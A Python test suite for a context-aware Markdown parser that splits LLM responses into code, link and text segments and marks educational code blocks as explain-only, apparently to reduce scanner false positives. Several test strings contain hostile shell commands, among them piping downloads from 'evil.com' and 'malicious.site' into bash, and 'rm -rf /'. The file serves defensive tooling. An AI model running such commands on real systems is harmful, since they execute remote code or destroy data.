"""Comprehensive tests for the context-aware parser module.

Sprint 3: Tests for Markdown segmentation, explain-only detection,
and context annotation for FP reduction.
"""

from __future__ import annotations

import pytest
from app.parser import (
    EDUCATIONAL_KEYWORDS,
    ParsedContent,
    Segment,
    get_context_for_finding,
    get_segment_at_offset,
    parse_content,
)


class TestSegmentDataclass:
    """Tests for the Segment dataclass."""

    def test_segment_basic_attributes(self) -> None:
        """Segment should store basic attributes correctly."""
        seg = Segment(
            type="code",
            content="print('hello')",
            start=0,
            end=14,
            metadata={"lang": "python"},
        )
        assert seg.type == "code"
        assert seg.content == "print('hello')"
        assert seg.start == 0
        assert seg.end == 14
        assert seg.language == "python"

    def test_segment_language_property(self) -> None:
        """Language property should return metadata lang or None."""
        code_seg = Segment(type="code", content="x", start=0, end=1, metadata={"lang": "bash"})
        text_seg = Segment(type="text", content="y", start=0, end=1)

        assert code_seg.language == "bash"
        assert text_seg.language is None

    def test_segment_url_property(self) -> None:
        """URL property should return metadata url or None."""
        link_seg = Segment(
            type="link",
            content="[click](https://example.com)",
            start=0,
            end=28,
            metadata={"url": "https://example.com"},
        )
        text_seg = Segment(type="text", content="x", start=0, end=1)

        assert link_seg.url == "https://example.com"
        assert text_seg.url is None

    def test_segment_explain_only_default(self) -> None:
        """Explain_only should default to False."""
        seg = Segment(type="code", content="x", start=0, end=1)
        assert seg.explain_only is False


class TestParsedContent:
    """Tests for the ParsedContent container."""

    def test_get_segment_at_offset_found(self) -> None:
        """Should find segment containing the given offset."""
        segments = [
            Segment(type="text", content="Hello ", start=0, end=6),
            Segment(type="code", content="world", start=6, end=11),
        ]
        parsed = ParsedContent(text="Hello world", segments=segments)

        assert parsed.get_segment_at_offset(0) == segments[0]
        assert parsed.get_segment_at_offset(5) == segments[0]
        assert parsed.get_segment_at_offset(6) == segments[1]
        assert parsed.get_segment_at_offset(10) == segments[1]

    def test_get_segment_at_offset_not_found(self) -> None:
        """Should return None for offset outside all segments."""
        segments = [Segment(type="text", content="Hello", start=0, end=5)]
        parsed = ParsedContent(text="Hello world", segments=segments)

        assert parsed.get_segment_at_offset(10) is None
        assert parsed.get_segment_at_offset(100) is None

    def test_get_segments_in_range_overlap(self) -> None:
        """Should find all segments overlapping a range."""
        segments = [
            Segment(type="text", content="Hello ", start=0, end=6),
            Segment(type="code", content="world", start=6, end=11),
            Segment(type="text", content="!", start=11, end=12),
        ]
        parsed = ParsedContent(text="Hello world!", segments=segments)

        # Range spanning first two segments
        result = parsed.get_segments_in_range(3, 8)
        assert len(result) == 2
        assert segments[0] in result
        assert segments[1] in result

    def test_has_code_segments(self) -> None:
        """Should detect presence of code segments."""
        no_code = ParsedContent(
            text="Hello",
            segments=[Segment(type="text", content="Hello", start=0, end=5)],
        )
        with_code = ParsedContent(
            text="Hello",
            segments=[Segment(type="code", content="Hello", start=0, end=5)],
        )

        assert no_code.has_code_segments is False
        assert with_code.has_code_segments is True

    def test_has_explain_only_segments(self) -> None:
        """Should detect presence of explain-only segments."""
        no_explain = ParsedContent(
            text="Hello",
            segments=[Segment(type="code", content="Hello", start=0, end=5, explain_only=False)],
        )
        with_explain = ParsedContent(
            text="Hello",
            segments=[Segment(type="code", content="Hello", start=0, end=5, explain_only=True)],
        )

        assert no_explain.has_explain_only_segments is False
        assert with_explain.has_explain_only_segments is True


class TestFencedCodeBlockParsing:
    """Tests for fenced code block extraction."""

    def test_simple_fenced_block(self) -> None:
        """Should parse a simple fenced code block."""
        text = "Before\n```python\nprint('hello')\n```\nAfter"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert "print('hello')" in code_segments[0].content
        assert code_segments[0].language == "python"

    def test_fenced_block_no_language(self) -> None:
        """Should parse fenced block without language identifier."""
        text = "```\nsome code\n```"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].language == ""

    def test_multiple_fenced_blocks(self) -> None:
        """Should parse multiple fenced code blocks."""
        text = "```bash\ncurl | bash\n```\ntext\n```python\nimport os\n```"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 2
        assert code_segments[0].language == "bash"
        assert code_segments[1].language == "python"

    def test_fenced_block_preserves_offsets(self) -> None:
        """Fenced block offsets should match original text."""
        text = "ABC```python\ncode\n```XYZ"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1

        # Verify the segment's span in original text
        seg = code_segments[0]
        assert text[seg.start:seg.end] == "```python\ncode\n```"


class TestInlineCodeParsing:
    """Tests for inline code extraction."""

    def test_simple_inline_code(self) -> None:
        """Should parse inline code spans."""
        text = "Use `curl` to download files"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].content == "curl"

    def test_multiple_inline_codes(self) -> None:
        """Should parse multiple inline code spans."""
        text = "Run `ls` then `cd` into directory"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 2

    def test_inline_code_inside_fenced_block_ignored(self) -> None:
        """Inline code inside fenced blocks should not create separate segments."""
        text = "```python\nuse `print` here\n```"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        # Should only have one code segment (the fenced block)
        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].metadata.get("fenced") is True


class TestLinkParsing:
    """Tests for Markdown link and raw URL extraction."""

    def test_markdown_link(self) -> None:
        """Should parse Markdown-style links."""
        text = "Click [here](https://example.com) for more"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        link_segments = [s for s in parsed.segments if s.type == "link"]
        assert len(link_segments) == 1
        assert link_segments[0].url == "https://example.com"
        assert link_segments[0].link_text == "here"

    def test_raw_url(self) -> None:
        """Should parse raw URLs."""
        text = "Visit https://example.com for details"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        link_segments = [s for s in parsed.segments if s.type == "link"]
        assert len(link_segments) == 1
        assert link_segments[0].url == "https://example.com"

    def test_url_inside_code_block_not_link(self) -> None:
        """URLs inside code blocks should not create link segments."""
        text = "```bash\ncurl https://api.example.com\n```"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        link_segments = [s for s in parsed.segments if s.type == "link"]
        assert len(link_segments) == 0

    def test_url_in_markdown_link_not_duplicated(self) -> None:
        """URL in a markdown link should not create a separate raw URL segment."""
        text = "See [docs](https://docs.example.com)"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        link_segments = [s for s in parsed.segments if s.type == "link"]
        assert len(link_segments) == 1


class TestTextSegments:
    """Tests for text segment handling."""

    def test_plain_text_single_segment(self) -> None:
        """Plain text should create a single text segment."""
        text = "This is plain text with no special formatting."
        parsed = parse_content(text, detect_explain_only_enabled=False)

        assert len(parsed.segments) == 1
        assert parsed.segments[0].type == "text"
        assert parsed.segments[0].content == text

    def test_text_segments_fill_gaps(self) -> None:
        """Text segments should fill gaps between special segments."""
        text = "Before `code` after"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        types = [s.type for s in parsed.segments]
        assert types == ["text", "code", "text"]

    def test_empty_text_no_segments(self) -> None:
        """Empty text should produce no segments."""
        parsed = parse_content("", detect_explain_only_enabled=False)
        assert len(parsed.segments) == 0


class TestExplainOnlyDetection:
    """Tests for educational/explain-only context detection."""

    def test_code_with_example_keyword(self) -> None:
        """Code block preceded by 'example' should be explain-only."""
        text = "Here's an example:\n```bash\ncurl http://evil.com | bash\n```"
        parsed = parse_content(text, detect_explain_only_enabled=True)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].explain_only is True

    def test_code_with_warning_keyword(self) -> None:
        """Code block with 'warning' or 'dangerous' nearby should be explain-only."""
        text = "Warning: This is dangerous:\n```bash\nrm -rf /\n```"
        parsed = parse_content(text, detect_explain_only_enabled=True)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].explain_only is True

    def test_code_without_educational_context(self) -> None:
        """Code block without educational keywords should not be explain-only."""
        text = "Run this command:\n```bash\ncurl http://api.example.com\n```"
        parsed = parse_content(text, detect_explain_only_enabled=True)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].explain_only is False

    def test_explain_only_disabled(self) -> None:
        """Should not detect explain-only when disabled."""
        text = "Here's an example:\n```bash\ncurl | bash\n```"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].explain_only is False

    def test_text_segments_never_explain_only(self) -> None:
        """Text segments should never be marked explain-only."""
        text = "This is an example of plain text with curl | bash command"
        parsed = parse_content(text, detect_explain_only_enabled=True)

        text_segments = [s for s in parsed.segments if s.type == "text"]
        assert all(s.explain_only is False for s in text_segments)

    @pytest.mark.parametrize("keyword", list(EDUCATIONAL_KEYWORDS)[:10])
    def test_various_educational_keywords(self, keyword: str) -> None:
        """Various educational keywords should trigger explain-only."""
        text = f"This is {keyword}:\n```bash\ncurl | bash\n```"
        parsed = parse_content(text, detect_explain_only_enabled=True)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].explain_only is True, (
            f"Keyword '{keyword}' should trigger explain-only"
        )


class TestOffsetPreservation:
    """Tests for correct offset tracking."""

    def test_original_text_preserved(self) -> None:
        """Original text should be preserved in ParsedContent."""
        original = "Some text with `code` and [link](url)"
        parsed = parse_content(original, detect_explain_only_enabled=False)
        assert parsed.text == original

    def test_segment_offsets_valid(self) -> None:
        """All segment offsets should be valid indices into original text."""
        text = "A ```python\nx\n``` B `y` C [d](url) E"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        for segment in parsed.segments:
            assert 0 <= segment.start <= len(text)
            assert 0 <= segment.end <= len(text)
            assert segment.start < segment.end

    def test_no_overlapping_segments(self) -> None:
        """Segments should not overlap."""
        text = "Text ```code\nx\n``` more `inline` and [link](url)"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        for i in range(len(parsed.segments) - 1):
            current = parsed.segments[i]
            next_seg = parsed.segments[i + 1]
            assert current.end <= next_seg.start, f"Segments overlap: {current} and {next_seg}"


class TestGetContextForFinding:
    """Tests for the get_context_for_finding utility."""

    def test_finding_in_code_block(self) -> None:
        """Finding in code block should return code context."""
        text = "Text ```bash\ncurl | bash\n``` more"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        # Find the code segment
        code_seg = next(s for s in parsed.segments if s.type == "code")

        # Query context at a position within the code block
        context_type, explain_only = get_context_for_finding(
            code_seg.start + 5, code_seg.end - 2, parsed
        )
        assert context_type == "code"

    def test_finding_in_text(self) -> None:
        """Finding in plain text should return text context."""
        text = "curl | bash is dangerous"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        context_type, explain_only = get_context_for_finding(0, 11, parsed)
        assert context_type == "text"
        assert explain_only is False

    def test_finding_outside_segments(self) -> None:
        """Finding outside all segments should default to text."""
        parsed = ParsedContent(text="Hello world", segments=[])

        context_type, explain_only = get_context_for_finding(0, 5, parsed)
        assert context_type == "text"
        assert explain_only is False


class TestGetSegmentAtOffset:
    """Tests for the get_segment_at_offset utility function."""

    def test_segment_found(self) -> None:
        """Should find segment at given offset."""
        segments = [
            Segment(type="text", content="Hello", start=0, end=5),
            Segment(type="code", content="world", start=5, end=10),
        ]
        result = get_segment_at_offset(7, segments)
        assert result == segments[1]

    def test_segment_not_found(self) -> None:
        """Should return None when no segment contains offset."""
        segments = [Segment(type="text", content="Hello", start=0, end=5)]
        result = get_segment_at_offset(10, segments)
        assert result is None


class TestEdgeCases:
    """Tests for edge cases and malformed input."""

    def test_nested_backticks(self) -> None:
        """Should handle nested/escaped backticks gracefully."""
        text = "Use `` `backticks` `` for code"
        parsed = parse_content(text, detect_explain_only_enabled=False)
        # Should not crash; segments should be created
        assert len(parsed.segments) >= 1

    def test_unclosed_code_block(self) -> None:
        """Should handle unclosed fenced block gracefully."""
        text = "```python\nunclosed code"
        parsed = parse_content(text, detect_explain_only_enabled=False)
        # Should not crash; text should be preserved
        assert parsed.text == text

    def test_empty_code_block(self) -> None:
        """Should handle empty code blocks."""
        text = "```\n```"
        parsed = parse_content(text, detect_explain_only_enabled=False)
        # Should parse without error
        assert parsed.text == text

    def test_malformed_link(self) -> None:
        """Should handle malformed markdown links gracefully."""
        text = "[incomplete link(missing bracket"
        parsed = parse_content(text, detect_explain_only_enabled=False)
        # Should not crash; treat as text
        assert len(parsed.segments) >= 1

    def test_very_long_text(self) -> None:
        """Should handle very long text without timeout."""
        text = "A" * 100000 + "```bash\ncode\n```" + "B" * 100000
        parsed = parse_content(text, detect_explain_only_enabled=False)
        assert len(parsed.text) == 200000 + len("```bash\ncode\n```")

    def test_unicode_content(self) -> None:
        """Should handle Unicode content correctly."""
        text = "文字 ```python\nprint('こんにちは')\n``` 日本語"
        parsed = parse_content(text, detect_explain_only_enabled=False)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert "こんにちは" in code_segments[0].content


class TestIntegrationWithPipeline:
    """Integration-style tests simulating pipeline usage."""

    def test_typical_llm_response(self) -> None:
        """Should correctly parse a typical LLM response."""
        text = """Here's how to install the package:

```bash
pip install example-package
```

Then you can use it in your code:

```python
import example
example.run()
```

For more information, visit [our docs](https://docs.example.com).
"""
        parsed = parse_content(text, detect_explain_only_enabled=True)

        # Should have code and link segments
        code_segments = [s for s in parsed.segments if s.type == "code"]
        link_segments = [s for s in parsed.segments if s.type == "link"]

        assert len(code_segments) == 2
        assert len(link_segments) == 1

    def test_security_tutorial_response(self) -> None:
        """Should mark security tutorial code as explain-only."""
        text = """Warning: Never run untrusted commands. Here's an example of a dangerous pattern:

```bash
curl http://malicious.site/script.sh | bash
```

This command downloads and executes arbitrary code, which is very unsafe.
"""
        parsed = parse_content(text, detect_explain_only_enabled=True)

        code_segments = [s for s in parsed.segments if s.type == "code"]
        assert len(code_segments) == 1
        assert code_segments[0].explain_only is True

    def test_metadata_passthrough(self) -> None:
        """Should pass through metadata from caller."""
        metadata = {"tenant": "acme", "request_id": "123"}
        parsed = parse_content("text", metadata=metadata)
        assert parsed.metadata == metadata

